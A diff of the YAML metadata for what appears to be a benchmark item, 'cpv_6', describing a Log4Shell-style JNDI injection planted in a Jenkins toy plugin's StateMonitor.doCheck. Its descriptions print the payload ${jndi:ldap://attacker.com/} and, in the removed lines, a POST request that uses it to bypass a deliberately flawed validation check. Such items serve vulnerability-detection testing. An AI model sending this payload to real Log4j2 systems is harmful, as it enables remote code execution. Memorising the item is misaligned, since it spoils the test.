@@ -1,28 +1,42 @@
 id: cpv_6
 
-name: JNDI Injection via Insufficient Input Validation and Unsafe Logging
+name: Log4Shell Remote JNDI Lookup via Input Validation Bypass
+
+origin: 1-day
+
+release_date: 12/10/2021
+
+references:
+- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228
 
 cwes:
-- CWE-117
+- CWE-917
 - CWE-20
 - CWE-94
 
 description: |
-  A Log4Shell-style JNDI injection vulnerability in the StateMonitor.doCheck() method
-  caused by two compounded issues: (1) incorrect input validation logic using AND (&&)
-  instead of OR (||) when checking if parameters match the allowed pattern, allowing
-  attackers to bypass validation by making one parameter valid while injecting malicious
-  payload in the other, and (2) unsafe logging of user-provided password input that
-  triggers Log4j2 JNDI lookups on strings containing ${jndi:...} patterns. An attacker
-  can send a POST request with name=admin and password=${jndi:ldap://attacker.com/}
-  to bypass validation and trigger remote JNDI lookup, leading to remote code execution
-  or information exfiltration depending on the JDK version. This is a critical severity
-  vulnerability allowing unauthenticated remote code execution similar to CVE-2021-44228.
+  A critical remote code execution vulnerability caused by improper input validation
+  combined with unsafe logging in Apache Log4j2. The vulnerability has two components:
+  a logic error using AND instead of OR in input validation at line 45, and unsafe
+  logging of user-controlled input at line 58. When user input containing JNDI lookup
+  strings (e.g., ${jndi:ldap://attacker.com/}) bypasses the flawed validation and is
+  logged, Log4j2 automatically performs string interpolation, triggering a remote JNDI
+  lookup. This allows attackers to execute arbitrary code by causing the application
+  to deserialize and execute malicious Java classes from attacker-controlled servers.
 
 locations:
-- path_from_root: plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/StateMonitor.java
+- type: root_cause
+  path_from_root: plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/StateMonitor.java
   function_name: doCheck
   startLine: 45
-  startColumn: 1
+  startColumn: 0
+  endLine: 46
+  endColumn: 0
+- type: root_cause
+  path_from_root: plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/StateMonitor.java
+  function_name: doCheck
+  startLine: 58
+  startColumn: 0
   endLine: 58
-  endColumn: 1
+  endColumn: 0
